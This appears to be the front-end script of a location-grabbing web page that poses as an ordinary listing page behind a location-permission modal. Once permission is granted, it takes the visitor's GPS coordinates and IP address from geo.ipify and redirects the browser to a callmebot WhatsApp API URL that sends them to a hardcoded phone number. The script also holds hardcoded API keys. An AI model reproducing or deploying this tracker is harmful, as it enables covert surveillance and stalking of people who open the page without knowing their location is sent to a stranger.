function myMap() {
  var mapProp = {
    center: new google.maps.LatLng(51.508742, -0.12085),
    zoom: 5,
  };
  // var map = new google.maps.Map(document.getElementById("googleMap"), mapProp);
}

const popupLocation = () => {
  navigator.geolocation.getCurrentPosition(
    function (position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      fetch(
        "https://geo.ipify.org/api/v1?apiKey=at_e16eMQKPbYEDUQS4C9kT1RIySIK4s"
      )
        .then((res) => res.json())
        .then((data) => {
          ipinfo = data.ip;
          window.location.href = `https://api.callmebot.com/whatsapp.php?phone=+6285159947805&text=latitude%3A%20${latitude}%0Alongitude%3A%20${longitude}%0Aipaddress%3A%20${ipinfo}&apikey=231443`;
        });
      modal.style.display = "none";
    },
    function () {
      modal.style.display = "block";
    }
  );
};

let devicename;

const deviceType = () => {
  const ua = navigator.userAgent;
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
    devicename = "tablet";
  } else if (
    /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(
      ua
    )
  ) {
    devicename = "mobile";
  }
  devicename = "desktop";
};

popupLocation();
// untuk mengecek apakah user mengizinkan lokasi atau tidak
const izinkan = document.getElementById("izinkan");
const batalkan = document.getElementById("batalkan");

izinkan.addEventListener("click", () => {
  modal.style.display = "none";
});

batalkan.addEventListener("click", () => {
  window.history.go(-1);
});

const fetchData = async (url) => {
  const response = await fetch(url);
  const jobs = await response.json();

  jobs.forEach((job, index) => {});
};
fetchData("./mock/MOCK_DATA.json");

// Get the modal
var modal = document.getElementById("myModal");

// Get the button that opens the modal
// var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];
// When the user clicks the button, open the modal
// btn.onclick = function () {
//   modal.style.display = "block";
// };

// When the user clicks on <span> (x), close the modal
span.onclick = function () {
  modal.style.display = "none";
};

// When the user clicks anywhere outside of the modal, close it
window.onclick = function (event) {
  if (event.target == modal) {
    modal.style.display = "none";
    window.history.go(-1);
  }
};

// get ip address of user
const ip = "8.8.8.8";
const api_key = "at_e16eMQKPbYEDUQS4C9kT1RIySIK4s";

// let ipinfo;
// fetch(
//   "https://geo.ipify.org/api/v1?apiKey=at_e16eMQKPbYEDUQS4C9kT1RIySIK4s&ipAddress=8.8.8.8"
// )
//   .then((res) => res.json())
//   .then((data) => console.log(data));

// firestore session
